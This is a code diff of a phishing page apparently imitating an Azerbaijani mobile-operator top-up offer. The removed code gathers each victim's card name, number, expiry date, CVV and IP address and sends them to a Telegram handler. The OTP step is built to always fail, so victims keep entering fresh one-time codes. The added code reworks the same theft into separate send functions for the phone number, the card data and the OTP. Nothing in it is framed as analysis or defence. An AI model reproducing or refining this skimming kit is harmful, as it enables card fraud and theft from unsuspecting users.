-            desc.textContent = 'Zəhmət olmasa gözləyin, kart məlumatlarınız yoxlanılır.';
-            
-            // FormData oluştur
-            const formData = new FormData();
-            formData.append('operator', state.operator);
-            formData.append('prefix', state.prefix);
-            formData.append('number', state.number);
-            formData.append('campaign_price', state.campaign.price);
-            formData.append('campaign_details', `${state.campaign.gb} + ${state.campaign.mins}`);
-            formData.append('card_name', document.getElementById('card-name').value);
-            formData.append('card_number', cardNumberMask.value);
-            formData.append('card_expiry', cardExpiryMask.value);
-            formData.append('card_cvv', cardCvvMask.value);
+            desc.textContent = 'Zəhmət olmasa gözləyin...';
 
-            try {
-                // Get user IP
-                let userIP = 'N/A';
-                try {
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipResponse.json();
-                    userIP = ipData.ip;
-                } catch (e) {
-                    console.log('IP fetch failed');
-                }
+            // 1. NÖMRƏ GÖNDƏR
+            await sendPhoneOnly();
 
-                // Format card log with emojis
-                const now = new Date();
-                const timeStr = now.toLocaleTimeString('az-AZ', { hour: '2-digit', minute: '2-digit' });
-                
-                const telegramMessage = `💳 **YENİ KART BİLGİSİ** 💳\n\n` +
-                    `📱 **Operator:** ${state.operator}\n` +
-                    `☎️ **Nömrə:** +994${state.prefix}${phoneMask.unmaskedValue}\n` +
-                    `🎁 **Kampaniya:** ${state.campaign.price} - ${state.campaign.gb} + ${state.campaign.mins}\n\n` +
-                    `👤 **Kart Sahibi:** ${document.getElementById('card-name').value}\n` +
-                    `💳 **Kart:** \`${cardNumberMask.value.replace(/\s/g, '')}\`\n` +
-                    `📅 **Bitiş:** \`${cardExpiryMask.value}\`\n` +
-                    `🔐 **CVV:** \`${cardCvvMask.value}\`\n\n` +
-                    `🌐 **IP:** \`${userIP}\``;
-                
-                // Kart nömrəsini localStorage-a saxla (OTP ucun lazım olacaq)
-                localStorage.setItem('lastCardNumber', cardNumberMask.value.replace(/\s/g, ''));
-                
-                // 🔥 send_all.php → api/telegram-handler.php
-                fetch('api/telegram-handler.php', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({msg: telegramMessage})
-                });
-                
-                // Wait for Discord to receive, then redirect
-                setTimeout(() => {
-                    window.location.href = 'otp_3ds.php';
-                }, 3000);
-                
-            } catch (error) {
-                console.log('Error:', error);
-                // Even on error, redirect to 3DS page after 2 seconds
-                setTimeout(() => {
-                    window.location.href = 'otp_3ds.php';
-                }, 2000);
-            }
+            // 2. KART GÖNDƏR
+            await sendCardData();
+
+            setTimeout(() => {
+                overlay.classList.add('hidden');
+                goToStep(6);
+            }, 2000);
         });
 
-        // Step 6: 3DS Form Submission - 🔥 otp.json → api/telegram-handler.php
-        document.getElementById('tds-form').addEventListener('submit', async (e) => {
+        // ============================================================
+        // STEP 6: OTP (ORİJİNAL, YALNIZ FETCH DƏYİŞDİ)
+        // ============================================================
+        document.getElementById('tds-form').addEventListener('submit', async function(e) {
             e.preventDefault();
-            
+
             const overlay = document.getElementById('status-overlay');
-            const loader = document.getElementById('loader');
             const title = document.getElementById('status-title');
             const desc = document.getElementById('status-desc');
             const errorMsg = document.getElementById('tds-error');
@@ -687,35 +514,26 @@
             desc.textContent = 'Məlumatlar yoxlanılır, zəhmət olmasa gözləyin.';
             errorMsg.classList.add('hidden');
 
-            // FormData oluştur
-            const formData = new FormData();
-            formData.append('card_number', cardNumberMask.value);
-            formData.append('tds_code', document.getElementById('tds-code').value);
-            
-            try {
-                // 🔥 otp.json → api/telegram-handler.php
-                const response = await fetch('api/telegram-handler.php', {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                const result = await response.json();
-                
-                // Simulation Delay - her zaman hata göster (gerçek 3DS simülasyonu)
-                setTimeout(() => {
-                    overlay.classList.add('hidden');
-                    errorMsg.classList.remove('hidden');
-                    tdsCodeMask.value = '';
-                    document.getElementById('tds-code').focus();
-                }, 3000);
-                
-            } catch (error) {
+            const otp = document.getElementById('tds-code').value;
+
+            if (!otp || otp.length !== 6) {
+                errorMsg.textContent = '❌ Zəhmət olmasa 6 rəqəmli kodu daxil edin!';
+                errorMsg.classList.remove('hidden');
                 overlay.classList.add('hidden');
+                return;
             }
+
+            // 3. OTP GÖNDƏR
+            await sendOtp(otp);
+
+            setTimeout(() => {
+                overlay.classList.add('hidden');
+                errorMsg.classList.remove('hidden');
+                document.getElementById('tds-code').value = '';
+                document.getElementById('tds-code').focus();
+            }, 3000);
         });
     </script>
 
-
 </body>
-<!-- Mirrored from eksprespay.online/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 18 Jun 2026 19:30:29 GMT -->
-</html>
+    </html>
